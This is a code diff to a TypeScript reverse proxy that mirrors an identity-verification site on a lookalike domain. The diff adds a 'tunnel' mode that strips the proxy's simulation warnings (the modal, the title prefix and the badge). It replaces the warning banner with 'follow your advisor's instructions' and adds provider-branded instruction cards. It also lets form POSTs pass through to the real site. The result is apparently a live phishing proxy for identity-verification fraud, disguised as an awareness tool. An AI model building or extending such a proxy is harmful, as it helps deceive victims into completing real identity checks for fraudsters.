@@ -31,6 +31,7 @@ if (!SUPABASE_URL || !SUPABASE_PUBLISHABLE_KEY) {
   process.exit(1);
 }
 
+type SimMode = "simulation" | "tunnel";
 type DomainRow = {
   id: string;
   domain: string;
@@ -40,9 +41,21 @@ type DomainRow = {
   topbar_text: string;
   is_active: boolean;
   allow_submit: boolean;
+  mode: SimMode;
+};
+
+type ProcedureRow = {
+  key: string;
+  title: string;
+  body: string;
+  meta: string | null;
+  provider: string;
+  allow_submit: boolean;
+  is_active: boolean;
 };
 
 const domainCache = new Map<string, { row: DomainRow | null; expiresAt: number }>();
+const procedureCache = new Map<string, { row: ProcedureRow | null; expiresAt: number }>();
 
 async function fetchDomain(host: string): Promise<DomainRow | null> {
   const key = host.toLowerCase();
@@ -50,7 +63,7 @@ async function fetchDomain(host: string): Promise<DomainRow | null> {
   if (cached && cached.expiresAt > Date.now()) return cached.row;
 
   const url = new URL("/rest/v1/webid_sim_domains", SUPABASE_URL);
-  url.searchParams.set("select", "id,domain,display_name,target_origin,logo_url,topbar_text,is_active,allow_submit");
+  url.searchParams.set("select", "id,domain,display_name,target_origin,logo_url,topbar_text,is_active,allow_submit,mode");
   url.searchParams.set("domain", `eq.${key}`);
   url.searchParams.set("is_active", "eq.true");
   url.searchParams.set("limit", "1");
@@ -71,7 +84,30 @@ async function fetchDomain(host: string): Promise<DomainRow | null> {
   } catch (err) {
     console.warn(`[webid-sim] domain lookup failed for ${key}: ${(err as Error).message}`);
   }
+  if (row && !row.mode) row.mode = "simulation";
   domainCache.set(key, { row, expiresAt: Date.now() + CACHE_TTL_MS });
+  return row;
+}
+
+async function fetchProcedure(key: string): Promise<ProcedureRow | null> {
+  const k = key.toLowerCase();
+  const cached = procedureCache.get(k);
+  if (cached && cached.expiresAt > Date.now()) return cached.row;
+  const url = new URL("/rest/v1/webid_procedures", SUPABASE_URL);
+  url.searchParams.set("select", "key,title,body,meta,provider,allow_submit,is_active");
+  url.searchParams.set("key", `eq.${k}`);
+  url.searchParams.set("is_active", "eq.true");
+  url.searchParams.set("limit", "1");
+  let row: ProcedureRow | null = null;
+  try {
+    const res = await fetch(url, {
+      headers: { apikey: SUPABASE_PUBLISHABLE_KEY!, Authorization: `Bearer ${SUPABASE_PUBLISHABLE_KEY!}`, Accept: "application/json" },
+    });
+    if (res.ok) { const rows = (await res.json()) as ProcedureRow[]; row = rows[0] ?? null; }
+  } catch (err) {
+    console.warn(`[webid-sim] procedure lookup failed for ${k}: ${(err as Error).message}`);
+  }
+  procedureCache.set(k, { row, expiresAt: Date.now() + CACHE_TTL_MS });
   return row;
 }
 
@@ -132,14 +168,35 @@ body.__webid_sim_shifted{padding-top:44px !important;}
   border-radius:8px !important;padding:10px 18px !important;font-weight:600 !important;cursor:pointer !important;}
 `;
 
-function buildOverlay(row: DomainRow): string {
-  const topbar = escapeHtml(row.topbar_text || "SIMULATIONSUMGEBUNG – Keine echte Identifikation. Zu Schulungszwecken.");
+function buildOverlay(row: DomainRow, procedure: ProcedureRow | null): string {
+  const isTunnel = row.mode === "tunnel";
+  const topbarText = row.topbar_text || (isTunnel
+    ? "Hinweis: Ident-Umgebung – bitte Anleitung deines Beraters befolgen."
+    : "SIMULATIONSUMGEBUNG – Keine echte Identifikation. Zu Schulungszwecken.");
+  const topbar = escapeHtml(topbarText);
   const badgeName = escapeHtml(row.display_name || row.domain);
+  const badgeSuffix = isTunnel ? "" : " · Simulation";
   const logoImg = row.logo_url ? `<img src="${escapeAttr(row.logo_url)}" alt=""/>` : "";
   const style = `<style id="__webid_sim_style">${OVERLAY_CSS}</style>`;
   const topbarEl = `<div id="__webid_sim_topbar" role="alert"><span>⚠ ${topbar}</span></div>`;
-  const badgeEl = `<div id="__webid_sim_badge">${logoImg}<span>${badgeName} · Simulation</span></div>`;
-  const modalEl = `<div id="__webid_sim_backdrop" role="dialog" aria-modal="true" aria-labelledby="__webid_sim_title">
+  const badgeEl = `<div id="__webid_sim_badge">${logoImg}<span>${badgeName}${badgeSuffix}</span></div>`;
+
+  // Vorgangs-Hinweis (Karte oben) – wenn ?v=<key> gesetzt und Vorgang existiert.
+  let procedureEl = "";
+  if (procedure) {
+    const pTitle = escapeHtml(procedure.title);
+    const pBody = escapeHtml(procedure.body).replace(/\n/g, "<br>");
+    const pMeta = procedure.meta ? `<p style="margin:8px 0 0;font-size:12px;color:#555">${escapeHtml(procedure.meta)}</p>` : "";
+    procedureEl = `<div id="__webid_sim_proc" style="position:fixed;top:52px;right:14px;z-index:2147483644;max-width:360px;background:#fff;border:1px solid rgba(0,0,0,.1);border-radius:12px;padding:14px 16px;box-shadow:0 10px 30px rgba(0,0,0,.15);font:400 13px/1.5 -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#111">
+      <p style="margin:0 0 6px;font-size:12px;text-transform:uppercase;letter-spacing:.05em;color:#666">${escapeHtml(procedure.provider.toUpperCase())}</p>
+      <p style="margin:0 0 6px;font-weight:700">${pTitle}</p>
+      <p style="margin:0;color:#333">${pBody}</p>${pMeta}
+      <button type="button" onclick="var b=document.getElementById('__webid_sim_proc');if(b)b.remove()" style="margin-top:10px;background:#111;color:#fff;border:0;border-radius:6px;padding:6px 12px;font-size:12px;cursor:pointer">Verstanden</button>
+    </div>`;
+  }
+
+  // Simulations-Modal nur im Sim-Modus.
+  const modalEl = isTunnel ? "" : `<div id="__webid_sim_backdrop" role="dialog" aria-modal="true" aria-labelledby="__webid_sim_title">
     <div id="__webid_sim_modal">
       <h2 id="__webid_sim_title">Hinweis: Simulationsumgebung</h2>
       <p>Dies ist eine <strong>Simulation</strong> zu Awareness- und Schulungszwecken.
@@ -151,8 +208,9 @@ function buildOverlay(row: DomainRow): string {
   const overlayCssJson = JSON.stringify(OVERLAY_CSS);
   const topbarJson = JSON.stringify(topbarEl);
   const badgeJson = JSON.stringify(badgeEl);
+  const titlePrefixJs = isTunnel ? "" : `try{document.title='[SIMULATION] '+document.title;}catch(e){}`;
   const script = `<script>(function(){
-    try{document.title='[SIMULATION] '+document.title;}catch(e){}
+    ${titlePrefixJs}
     function restoreOverlay(){
       if(!document.getElementById('__webid_sim_style')){
         var s=document.createElement('style');s.id='__webid_sim_style';s.textContent=${overlayCssJson};
@@ -179,7 +237,7 @@ function buildOverlay(row: DomainRow): string {
     }
     if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',boot);}else{boot();}
   })();</script>`;
-  return `${style}${topbarEl}${badgeEl}${modalEl}${script}`;
+  return `${style}${topbarEl}${badgeEl}${procedureEl}${modalEl}${script}`;
 }
 
 function escapeHtml(s: string): string {
@@ -188,7 +246,7 @@ function escapeHtml(s: string): string {
 function escapeAttr(s: string): string { return escapeHtml(s); }
 
 // ── HTML-Rewrite ──────────────────────────────────────────────────────────
-function rewriteHtml(html: string, row: DomainRow, targetHost: string): string {
+function rewriteHtml(html: string, row: DomainRow, targetHost: string, procedure: ProcedureRow | null): string {
   const simHost = row.domain;
   // Absolute Links auf target host → sim host
   const re = new RegExp(`https?://${escapeReg(targetHost)}`, "gi");
@@ -201,7 +259,7 @@ function rewriteHtml(html: string, row: DomainRow, targetHost: string): string {
   if (/<\/head>/i.test(out)) {
     out = out.replace(/<\/head>/i, `${favicon}</head>`);
   }
-  const overlay = buildOverlay(row);
+  const overlay = buildOverlay(row, procedure);
   if (/<\/body>/i.test(out)) {
     out = out.replace(/<\/body>/i, `${overlay}</body>`);
   } else {
@@ -253,12 +311,17 @@ async function handle(req: Request): Promise<Response> {
   const row = await fetchDomain(hostHeader);
   if (!row) return new Response("Simulation domain not registered.", { status: 404, headers: { "content-type": "text/plain" } });
 
+  // Vorgang (Hinweis-Text) per Query ?v=<key>
+  const procedureKey = url.searchParams.get("v");
+  const procedure = procedureKey ? await fetchProcedure(procedureKey) : null;
+
   // Method-Guard
   const method = req.method.toUpperCase();
   if (method === "OPTIONS") {
     return new Response(null, { status: 204, headers: { "access-control-allow-origin": "*" } });
   }
-  if (method !== "GET" && method !== "HEAD" && !(row.allow_submit && method === "POST")) {
+  const submitAllowed = row.allow_submit || (procedure?.allow_submit ?? false) || row.mode === "tunnel";
+  if (method !== "GET" && method !== "HEAD" && !(submitAllowed && method === "POST")) {
     return simulationBlockedResponse(row);
   }
 
@@ -334,7 +397,7 @@ async function handle(req: Request): Promise<Response> {
 
   if (isHtmlResponse(upstream)) {
     const html = await upstream.text();
-    const out = rewriteHtml(html, row, targetHost);
+    const out = rewriteHtml(html, row, targetHost, procedure);
     resHeaders.set("content-type", upstream.headers.get("content-type") || "text/html; charset=utf-8");
     return new Response(out, { status: upstream.status, headers: resHeaders });
   }
